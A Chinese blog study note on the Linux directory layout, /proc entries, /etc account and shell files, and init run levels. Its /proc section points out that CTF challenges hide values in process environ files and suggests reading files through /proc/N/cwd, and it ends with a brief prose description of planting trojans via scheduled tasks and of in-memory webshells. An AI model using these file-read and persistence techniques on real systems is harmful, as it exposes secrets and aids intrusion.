+<p>如果妳想要<strong>暂时挂载某些额外的装置</strong>，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与&#x2F;media相同啦。 只是有了&#x2F;media之后，这个目录就用来暂时挂载用了。</p>
+<p>&#x2F;opt</p>
+<p>这个是给<strong>第三方协力软体</strong>放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果你想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在&#x2F;usr&#x2F;local目录下。</p>
+<p>&#x2F;root</p>
+<p>系统管理员(<strong>root)的家目录</strong>。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。</p>
+<p>&#x2F;sbin</p>
+<p>Linux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来设定系统，其他使用者最多只能用来查询而已。放在&#x2F;sbin底下的为开机过程中所需要的，里面<strong>包括了开机、修复、还原系统所需要的指令</strong>。至于某些伺服器软体程式，一般则放置到**&#x2F;usr&#x2F;sbin&#x2F;<strong>当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到</strong>&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;**当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。</p>
+<p>&#x2F;srv</p>
+<p>srv可以视为service的缩写，是一些网路服务启动之后，这些服务所需要取用的<strong>资料目录</strong>。 常见的服务例如WWW, FTP等等。 举例来说，<strong>WWW伺服器需要的网页资料就可以放置在&#x2F;srv&#x2F;www&#x2F;里面。呵呵，看来平时我们编写的代码应该放到这里了。</strong></p>
+<p>&#x2F;tmp</p>
+<p>这是让一般使用者或者是正在执行的程序<strong>暂时放置档案</strong>的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊。 因为FHS甚至建议在开机时，应该要将&#x2F;tmp下的资料都删除。</p>
+<p>还有下面这些</p>
+<p>&#x2F;lost+found</p>
+<p>这个目录是使用标准的ext2&#x2F;ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于&#x2F;disk中，那在这个系统下就会自动产生一个这样的目录&#x2F;disk&#x2F;lost+found</p>
+<p>&#x2F;proc</p>
+<p>这个目录本身是一个<strong>虚拟文件系统</strong>(virtual filesystem)喔。 他放置的资料都是在内存当中，例如系统核心、行程资讯(process)（是进程吗?）、周边装置的状态及网络状态等等。因为这个目录下的资料都是在记忆体（内存）当中，所以本身不占任何硬盘空间。比较重要的档案（目录）例如： &#x2F;proc&#x2F;cpuinfo, &#x2F;proc&#x2F;dma, &#x2F;proc&#x2F;interrupts, &#x2F;proc&#x2F;ioports, &#x2F;proc&#x2F;net&#x2F;*等等。呵呵，是虚拟内存吗[guest]？</p>
+<p>&#x2F;sys</p>
+<p>这个目录其实跟&#x2F;proc非常类似，也是一个<strong>虚拟的档案系统</strong>，主要也是记录与<strong>核心相关的资讯</strong>。 包括目前已载入的核心模组与核心侦测到的硬体装置资讯等等。 这个目录同样不占硬盘容量。</p>
+<p>推荐博客</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/silence-hust/p/4319415.html">https://www.cnblogs.com/silence-hust/p/4319415.html</a></p>
+<h2 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h2><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221025215812113.png"></p>
+<p><strong>文件类型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> [d]  -&gt; directory  目录</span><br><span class="line"> [-]  -&gt; 文件</span><br><span class="line"> [l]  -&gt; link  连接文档（快捷方式）</span><br><span class="line"> &#123;</span><br><span class="line">     [b]  -&gt; 装置文件里的可供存储的接口设备（可随机存取装置）</span><br><span class="line">     [c]  -&gt; 装置文件里面的串行端口设备，如键盘鼠标（一次性读取装置）</span><br><span class="line"> &#125;  -&gt; 了解即可</span><br></pre></td></tr></table></figure>
+
+<p><strong>权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> r  -&gt; 读权限  值：4</span><br><span class="line"> w  -&gt; 写权限  值: 2</span><br><span class="line"> x  -&gt; 执行权限 值：1 （对于普通文件代表执行，对于目录文件代表可进入）</span><br><span class="line"> ​</span><br><span class="line"> u  -&gt; user属主访问权限（拥有者）</span><br><span class="line"> g  -&gt; group属组访问权限（和拥有者同组的人）</span><br><span class="line"> 0  -&gt; other其他人访问权限</span><br><span class="line"> ​</span><br><span class="line"> e.g:  drwxrwxr-x</span><br><span class="line">       u  g o</span><br></pre></td></tr></table></figure>
+
+<h3 id="根目录下所有目录"><a href="#根目录下所有目录" class="headerlink" title="根目录下所有目录"></a>根目录下所有目录</h3><h5 id="bin"><a href="#bin" class="headerlink" title="&#x2F;bin"></a>&#x2F;bin</h5><p>bin是binary的缩写，这个目录存放的都是二进制可执行文件，bin目录放置的是最基本的一些<strong>命令</strong>的可执行文件，比如cp、mv、mkdir、chmod、chown等等。&#x2F;usr下面也有一个&#x2F;bin目录，它里面的文件也是一些命令的可执行文件。</p>
+<p>bin下存放一些普通的基本命令，如ls,chmod等，这些命令在Linux系统里的配置文件脚本里经常用到。也就是主要放置一些系统的必备执行档</p>
+<h5 id="sbin"><a href="#sbin" class="headerlink" title="&#x2F;sbin"></a>&#x2F;sbin</h5><p>s是super user，也就管理员。这个目录和&#x2F;bin目录很像，也存放着一些程序，不过有些程序需要变成管理员才能执行。主要还是放置一些系统管理的必备程式</p>
+<p>&#x2F;sbin 下的命令属于基本的系统命令，如shutdown，reboot，用于启动系统，修复系统</p>
+<h5 id="etc"><a href="#etc" class="headerlink" title="&#x2F;etc ***"></a>&#x2F;etc ***</h5><p>这个目录用来存放所有的系统管理所需要的<strong>配置文件</strong>和子目录</p>
+<h5 id="home"><a href="#home" class="headerlink" title="&#x2F;home"></a>&#x2F;home</h5><p><strong>用户的主目录</strong>，在linux中，每个用户都有一个自己的目录，一般该目录是以用户的账号命名的</p>
+<h5 id="lib"><a href="#lib" class="headerlink" title="&#x2F;lib"></a>&#x2F;lib</h5><p>这个目录里面存放着系统最基本的<strong>动态连接共享库</strong>，其作用类似于Windows里的<strong>DLL</strong>文件。几乎所有的应用程序都需要用到这些共享库。</p>
+<h5 id="lost-found"><a href="#lost-found" class="headerlink" title="&#x2F;lost+found"></a>&#x2F;lost+found</h5><p>这个目录一般情况下是空的，当系统<strong>非法关机</strong>后，这里就存放了一些文件。</p>
+<h5 id="media"><a href="#media" class="headerlink" title="&#x2F;media"></a>&#x2F;media</h5><p>linux系统会自动识别一些设备，例如U盘，光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。</p>
+<h5 id="mnt"><a href="#mnt" class="headerlink" title="&#x2F;mnt"></a>&#x2F;mnt</h5><p>系统提供该目录是为了让用户<strong>临时挂载别的文件系统</strong>的，我们可以将光驱挂载在&#x2F;mnt&#x2F;上，然后进入该目录就可以查看光驱里的内容了。</p>
+<h5 id="opt"><a href="#opt" class="headerlink" title="&#x2F;opt ***"></a>&#x2F;opt ***</h5><p>这个给主机<strong>额外安装软件</strong>所摆放的目录。比如安装一个oracle数据库就可以放到这个目录下。默认是空的。</p>
+<h5 id="proc"><a href="#proc" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h5><p>这个目录是一个虚拟目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<strong>这个目录的内容不在硬盘上而是在内存里</strong></p>
+<h5 id="root"><a href="#root" class="headerlink" title="&#x2F;root"></a>&#x2F;root</h5><p>该目录为系统管理员，也称作超级权限者的用户主目录</p>
+<h5 id="selinux"><a href="#selinux" class="headerlink" title="&#x2F;selinux"></a>&#x2F;selinux</h5><p>这个目录是Redhat&#x2F;centOS所特有的目录，selinux是一个安全机制，类似于Windows的<strong>防火墙</strong>，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p>
+<h5 id="srv"><a href="#srv" class="headerlink" title="&#x2F;srv"></a>&#x2F;srv</h5><p>该目录存放一些服务启动之后需要<strong>提取的数据</strong></p>
+<h5 id="sys"><a href="#sys" class="headerlink" title="&#x2F;sys"></a>&#x2F;sys</h5><p>这是Linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统sysfs</p>
+<h5 id="tmp"><a href="#tmp" class="headerlink" title="&#x2F;tmp"></a>&#x2F;tmp</h5><p>这个目录只用来存放一些<strong>临时文件</strong>的。</p>
+<h5 id="usr"><a href="#usr" class="headerlink" title="&#x2F;usr"></a>&#x2F;usr</h5><p>用户的很多应用程序和文件都放在这个目录下，类似于Windows下的<strong>program files</strong>目录。</p>
+<h6 id="usr-bin"><a href="#usr-bin" class="headerlink" title="&#x2F;usr&#x2F;bin"></a>&#x2F;usr&#x2F;bin</h6><p>系统用户使用的<strong>应用程序</strong></p>
+<p>&#x2F;usr&#x2F;bin存放一些用户命令。</p>
+<p><strong>是你在后期安装的一些软件的运行脚本</strong>。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome_、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb_、wget等。</p>
+<h6 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="&#x2F;usr&#x2F;sbin"></a>&#x2F;usr&#x2F;sbin</h6><p>超级用户使用的比较高级的<strong>管理员程序和系统守护系统</strong>。 &#x2F;usr&#x2F;sbin存放的一些非必须的系统命令</p>
+<p>放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。</p>
+<h6 id="usr-src"><a href="#usr-src" class="headerlink" title="&#x2F;usr&#x2F;src"></a>&#x2F;usr&#x2F;src</h6><p><strong>内核源码</strong>默认的放置位置</p>
+<h5 id="var"><a href="#var" class="headerlink" title="&#x2F;var ***"></a>&#x2F;var ***</h5><p>这个目录中存放着在不断扩充着的东西，我们习惯将那些<strong>经常被修改</strong>的目录放在这个目录下。包括各种<strong>日志文件</strong></p>
+<h3 id="重要目录"><a href="#重要目录" class="headerlink" title="重要目录"></a>重要目录</h3><h4 id="proc-1"><a href="#proc-1" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h4><h5 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h5><p>一种文件系统，一种<strong>伪文件</strong>系统（也即虚拟文件系统）伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>
+<p>由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的</p>
+<p>用户可以通过这些文件查看有关<strong>系统硬件</strong>及当前正在<strong>运行进程</strong>的信息，甚至可以通过更改其中某些文件来改变<strong>内核</strong>的运行状态。</p>
+<p>还有的是一些以数字命名的目录，它们是<strong>进程目录</strong>(一个目录就是一个进程)。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是<strong>读取进程信息的接口</strong>。而<strong>self</strong>目录则是<strong>读取进程本身</strong>的信息接口，是一个link。</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202116575-1024x150.png" style="zoom: 80%;" />
+
+<h5 id="各种目录"><a href="#各种目录" class="headerlink" title="各种目录"></a>各种目录</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202241887-1024x78.png"></p>
+<h6 id="proc-cmdline"><a href="#proc-cmdline" class="headerlink" title="&#x2F;proc&#x2F;cmdline"></a>&#x2F;proc&#x2F;<strong>cmdline</strong></h6><p>载入 kernel 时所下达的相关指令与参数！查阅此文件，可了解指令是如何启动的！</p>
+<p>例如：pythonloader.pyc 中间空格被省略掉了，用readline能查看完整的。 此语句意思是用python运行loader.pyc</p>
+<h6 id="proc-N-environ"><a href="#proc-N-environ" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;environ"></a>&#x2F;proc&#x2F;N&#x2F;environ</h6><p>进程环境变量列表（<strong>有些时候一些CTF题会吧重要变量或者值存放在这个目录下</strong>）</p>
+<h6 id="proc-N-exe"><a href="#proc-N-exe" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;exe"></a>&#x2F;proc&#x2F;N&#x2F;<strong>exe</strong></h6><p>exe 是一个指向启动当前进程的<strong>可执行文件（完整路径）</strong>的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</p>
+<h6 id="proc-maps"><a href="#proc-maps" class="headerlink" title="&#x2F;proc&#x2F;maps"></a>&#x2F;proc&#x2F;maps</h6><p>当前进程关联到的每个<strong>可执行文件和库文件</strong>在内存中的映射区域及其访问权限所组成的列表</p>
+<p>找到&#x2F;app后的文件：app.cpython-39-x86_64-linux-gnu.so</p>
+<p>特殊格式： .so结尾，有<strong>版本号信息</strong></p>
+<h6 id="proc-N-fd"><a href="#proc-N-fd" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;fd"></a>&#x2F;proc&#x2F;N&#x2F;fd</h6><p>包含进程相关的所有的<strong>文件描述符</strong></p>
+<h6 id="proc-cpuinfo"><a href="#proc-cpuinfo" class="headerlink" title="&#x2F;proc&#x2F;cpuinfo"></a>&#x2F;proc&#x2F;cpuinfo</h6><p>本机的 <strong>CPU 的相关信息</strong>，包含<strong>频率</strong>、<strong>类型</strong>与<strong>运算功能</strong>等</p>
+<h6 id="proc-modules"><a href="#proc-modules" class="headerlink" title="&#x2F;proc&#x2F;modules"></a>&#x2F;proc&#x2F;modules</h6><p>目前我们的 Linux 已经载入的<strong>模块列表</strong>，也可以想成是驱动程序啦！</p>
+<h6 id="proc-fb"><a href="#proc-fb" class="headerlink" title="&#x2F;proc&#x2F;fb"></a>&#x2F;proc&#x2F;fb</h6><p>帧缓冲设备列表，包括数量和控制它的驱动</p>
+<h6 id="proc-stat"><a href="#proc-stat" class="headerlink" title="&#x2F;proc&#x2F;stat"></a>&#x2F;proc&#x2F;stat</h6><p>系统的一些状态信息，所有的CPU活动信息</p>
+<h6 id="proc-N-cwd"><a href="#proc-N-cwd" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;cwd"></a>&#x2F;proc&#x2F;N&#x2F;cwd</h6><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录</p>
+<p>e.g: app.cpython-39-x86_64-linux-gnu.so</p>
+<p><strong>cat &#x2F;proc&#x2F;N&#x2F;cwd&#x2F;filename</strong></p>
+<p>打开进程当前<strong>运行文件</strong></p>
+<h4 id="etc-1"><a href="#etc-1" class="headerlink" title="&#x2F;etc"></a>&#x2F;etc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #这个目录用来存放所有的系统管理所需要的配置文件和子目录</span><br></pre></td></tr></table></figure>
+
+<h6 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h6><p>用户数据库，其中的域给出了用户名、真实姓名、家目录、加密的口令和用户的其他信息.</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202509378.png" style="zoom:67%;" />
+
+<p>每行用户信息都以**”：”**作为分隔符，划分为7个字段。</p>
+<p>如下图各个字段含义：</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/4b27211904a247f5b42fcb706ddbfb12.jpeg" style="zoom:67%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &quot;x&quot;：表示此用户设有密码，但不是真正的密码，真正的密码保存在/etc/shadow文件。</span><br><span class="line"> &#x27;UID&#x27;:UID为0就代表这个账号是管理员账号,1-499(系统用户)500-65535（普通用户）</span><br><span class="line"> &#x27;shell&#x27;:shell是Linux的命令解释器，用户和Linux内核之间沟通的桥梁。</span><br><span class="line"> Shell命令解释器的功能就是将用户输入的命令转换成系统可以识别的机器语言。</span><br><span class="line"> 通常情况下，Linux系统默认使用的命令解释器是/bin/bash，当然还有其他命令解释器。</span><br><span class="line"> (命令行解释器是一个单独的软件程序，它可在用户和操作系统之间提供直接的通讯。命令行解释器是解释器的一种，用于对命令行进行解释执行。)</span><br><span class="line"> &#x27;zsh&#x27;:2022更新之后kali采用的shell版本，史称终极shell。（zsh搭配上&quot;oh my zsh&quot;真的好用到爆）</span><br></pre></td></tr></table></figure>
+
+<h6 id="etc-shells"><a href="#etc-shells" class="headerlink" title="&#x2F;etc&#x2F;shells"></a>&#x2F;etc&#x2F;shells</h6><p>列出可信任的<strong>shell.chsh 命令</strong>允许用户在本文件指定范围内改变登录shell.提供一台机器FTP服务的服务进程ftpd检查用户shell是否列在 &#x2F;etc&#x2F;shells 文件中，如果不是将不允许该用户登录.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 功能：这个文件记录了你当前Linux系统中所支持的shell版本（只是其中的一部分，还有其他shell在别的路径下）</span><br><span class="line"> 作用：系统上合法的shell都要写入到这个文件中。当系统进行某些服务时就能够依据这个文件的记录来进行操作</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225108937-1024x284.png" style="zoom:67%;" />
+
+<p>（用的centos所以没有zsh）</p>
+<p>不同的用户登录系统时,系统会给不同的默认shell版本。具体是什么可以在**&#x2F;etc&#x2F;passwd**中看shell一栏</p>
+<p><strong>shell</strong></p>
+<p>Shell是Linux&#x2F;Unix的一个外壳，你理解成衣服也行。它负责<strong>外界与Linux内核的交互</strong>，接收用户或其他应用程序的命令，然后把这些命令转化成内核能理解的语言，传给内核，内核是真正干活的，干完之后再把结果返回用户或应用程序。</p>
+<p><strong>shell版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> sh（Bourne shell）：第一个流行的shell由Steven Bourne发展出来的</span><br><span class="line"> csh（C shell）：由伯克利大学的Bill Joy设计依附于BSD版的UNIX系统中的shell，这个语言有点类似C语言，所以简称csh</span><br><span class="line"> tcsh：整合了csh，提供了更多的功能</span><br><span class="line"> bash：当前Linux版本的shell。这个shell是Bourne shell的增强版本，也是基于GNU的架构下的发展</span><br><span class="line"> 商业上用的K shell，还有TCSH等</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bash shell的功能</strong>(dd)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 概念：bash是Linux默认的shell，主要兼容与sh</span><br></pre></td></tr></table></figure>
+
+<p>功能①：历史命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~/.bash_history文件：bash记录了你曾经使用过的命令，不同的用户使用过的历史命令也不同，这些历史命令都记录在自己家目录下的.bash_history文件中</span><br><span class="line"> ~/.bash_history记录的是你上一次登录系统所执行过的命令，而至于这一次所执行过的命令都被缓冲在内存中，当你系统关机/重启后才会更新到~/.bash_history文件中</span><br></pre></td></tr></table></figure>
+
+<p>功能②：命令与文件补齐功能（tab键）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Linux系统下tab键补齐功能十分好用</span><br><span class="line"> 若安装了bash-completion软件，则在某些命令后面使用Tab按键时，可以进行选项与参数补齐的功能</span><br></pre></td></tr></table></figure>
+
+<p>功能③：命令别名设置功能（alias）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> alias命令：这个命令可以给命令取别名</span><br></pre></td></tr></table></figure>
+
+<p>功能④：任务管理、前台、后台控制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 任务管理的用途广泛，可以将人物丢到后台运行</span><br><span class="line"> 任务前、后台的控制可以让任务进行的更为顺利</span><br></pre></td></tr></table></figure>
+
+<p>功能⑤：程序化脚本（shell scripts）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 从前DOS年代需要将一堆命令写在一起来形成批处理文件（编程语言书写）</span><br><span class="line"> 而在Linux系统中，可以通过shell提供的环境变量以及相关命令来设计shell脚本，就能够实现相应的功能</span><br></pre></td></tr></table></figure>
+
+<p>功能⑥：通配符*</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> Linux使用*通配符，使用方便</span><br></pre></td></tr></table></figure>
+
+<h6 id="etc-group"><a href="#etc-group" class="headerlink" title="&#x2F;etc&#x2F;group"></a>&#x2F;etc&#x2F;group</h6><p>　　类似&#x2F;etc&#x2F;passwd ，但说明的不是用户而是组.</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210139910.png" style="zoom:67%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> root:   x  ：   0      ： </span><br><span class="line">                          </span><br><span class="line"> 组名：组密码：组ID（GID）：组中用户</span><br></pre></td></tr></table></figure>
+
+<h6 id="etc-fstab"><a href="#etc-fstab" class="headerlink" title="&#x2F;etc&#x2F;fstab"></a>&#x2F;etc&#x2F;fstab</h6><p>　　启动时mount -a命令(在&#x2F;etc&#x2F;rc 或等效的启动文件中)自动mount的文件系统列表.<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/linux">linux</a>下，也包括用swapon -a启用的swap区的信息.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210033960-1024x101.png"></p>
+<h6 id="etc-rc-d"><a href="#etc-rc-d" class="headerlink" title="&#x2F;etc&#x2F;rc.d"></a>&#x2F;etc&#x2F;rc.d</h6><p><strong>进程</strong></p>
+<p>要弄懂这个文件首先要知道操作系统中进程的意思</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> #狭义定义：</span><br><span class="line"> 进程是正在运行的程序的实例（an instance of a computer program that is being executed）。</span><br><span class="line"> #广义定义：</span><br><span class="line"> 进程是一个具有一定独立功能的程序关于某个数据集合的一次运行活动。它是操作系统动态执行的基本单元，在传统的操作系统中，进程既是基本的分配单元，也是基本的执行单元。</span><br><span class="line"> #进程的概念主要有两点：</span><br><span class="line"> 第一，进程是一个实体。每一个进程都有它自己的地址空间，一般情况下，包括文本区域（text region）、数据区域（data region）和堆栈（stack region）。文本区域存储处理器执行的代码；数据区域存储变量和进程执行期间使用的动态分配的内存；堆栈区域存储着活动过程调用的指令和本地变量。</span><br><span class="line"> ​</span><br><span class="line"> 第二，进程是一个“执行中的程序”。程序是一个没有生命的实体，只有处理器赋予程序生命时（操作系统执行之），它才能成为一个活动的实体，我们称其为进程。 </span><br><span class="line"> 进程是操作系统中最基本、重要的概念。是多道程序系统出现后，为了刻画系统内部出现的动态情况，描述系统内部各道程序的活动规律引进的一个概念,所有多道程序设计操作系统都建立在进程的基础上。</span><br></pre></td></tr></table></figure>
+
+<p><strong>内容</strong></p>
+<p>rc.d的内容如下: init.d&#x2F; :各种服务器和程序的二进制文件存放目录。 rc[x].d&#x2F;: 各个<strong>启动级别</strong>的执行程序连接目录。里头的东西都是指向init.d&#x2F;的一些软连接。具体的后边叙述。 还有三个脚本:rc.sysinit, rc, rc.local</p>
+<p><strong>CentOS目录</strong>（注意kali和centos目录结构略有不同，网上大多是centos的目录结构）</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026221707080-1024x373.png" style="zoom:50%;" />
+
+<p><strong>运行级别(run level)</strong></p>
+<p>Init进程是系统启动之后的第一个用户进程，所以它的pid(进程编号)始终为1。init进程上来首先做的事是去读取&#x2F;etc&#x2F;目录下inittab文件中initdefault id值，这个值称为运行级别(run-level)。它决定了系统启动之后运行于什么级别。运行级别决定了系统启动的绝大部分行为和目的。这个级别从0到6 ，具有不同的功能。不同的运行级定义如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 0 - 停机（千万别把initdefault设置为0，否则系统永远无法启动）</span><br><span class="line"> 1 - 单用户模式</span><br><span class="line"> 2 - 多用户，没有 NFS</span><br><span class="line"> 3 - 完全多用户模式(标准的运行级)</span><br><span class="line"> 4 – 系统保留的</span><br><span class="line"> 5 - X11 （x window)</span><br><span class="line"> 6 - 重新启动 （千万不要把initdefault 设置为6，否则将一直在重启 ）</span><br></pre></td></tr></table></figure>
+
+<p>rc.d包含许多系统服务的启动和停止<strong>脚本</strong>。它控制着所有从 acpid 到 x11-common 的各种事务。</p>
+<h6 id="etc-init-d"><a href="#etc-init-d" class="headerlink" title="&#x2F;etc&#x2F;init.d"></a>&#x2F;etc&#x2F;init.d</h6><p>目录 <code>/etc/init.d</code> 是<strong>符号链接文件</strong>，实际上是链接到目录 <strong>&#x2F;etc&#x2F;rc.d&#x2F;init.d</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222100823-1024x72.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20210521100903155.jpg"></p>
+<p>(kali系统下)init.d中的脚本文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> init.d里面放的都是什么东西?这个目录存放的是一些脚本，一般是linux以rpm包安装时设定的一些服务的启动脚本。系统在安装时装了好多rpm包，这里面就有很多对应的脚本。执行这些脚本可以用来启动，停止，重启这些服务。</span><br><span class="line"> 前面说到，/etc/rc.d/init.d这个目录下的脚本就类似与windows中的注册表，在系统启动的时候执行。程序运行到这里(init进程读取了运行级别)，相信从命名的角度大家也能猜到该运行/etc/rc.d/init.d里面的脚本了，不然它为什么也叫init(.d)呢是吧。没错，是该运行init.d里的脚本了，但是并不是直接运行，而是有选择的因为系统并不需要启动所有的服务。</span><br><span class="line">     那么，系统是如何选择哪些需要启动哪些不要呢？这时刚才说的运行级别就起作用了。</span><br><span class="line">     在决定了系统启动的run level之后，/etc/rc.d/rc这个脚本先执行。在RH9和FC7的源码中它都是一上来就check_runlevel()（虽然实现的代码不一样，也大同小异），知道了运行级别之后，对于每一个运行级别，在rc.d下都有一个子目录分别是rc0.d，rc1.d ….. rc6.d。每个目录下都是到init.d目录的一部分脚本一些链接。每个级别要执行哪些服务就在相对应的目录下，比如级别5要启动的服务就都放在rc5.d下，但是放在这个rc5.d下的都是一些链接文件，链接到init.d中相对应的文件，真正干活的init.d里的脚本。</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210635328-1024x410.png" style="zoom: 67%;" />
+
+<p><strong>放马</strong></p>
+<p>这个文件关于计划任务，这中间就存在一定的放马攻击。</p>
+<p><strong>内存马的3大特点</strong> 内存马的概念特性，除了隐蔽性、不易被察觉以外，其还有如下几个特点：1、内存马无逻辑结构边界，难以被发现。内存马仅存在于进程的内存空间中，通常与正常的&#x2F;合法的代码、数据混淆。内存马与传统恶意代码的不同之处在于它没有磁盘文件，会导致传统的检测防护手段失效。2、内存马缺乏稳定的静态特征，难以被识别。内存马缺乏结构化的静态形式，它依附在进程运行期间的输入数据进入进程，数据可能被加密混淆，因此，无法通过特征识别内存马。3、 内存马种类多，检测机制复杂而多样。内存马有二进制代码片段（Shellcode）、PowerShell脚本、Web中间件等类型，每种类型又可细分，不同类型内存马的执行方式、恶意代码&#x2F;行为触发机制各不相同。</p>
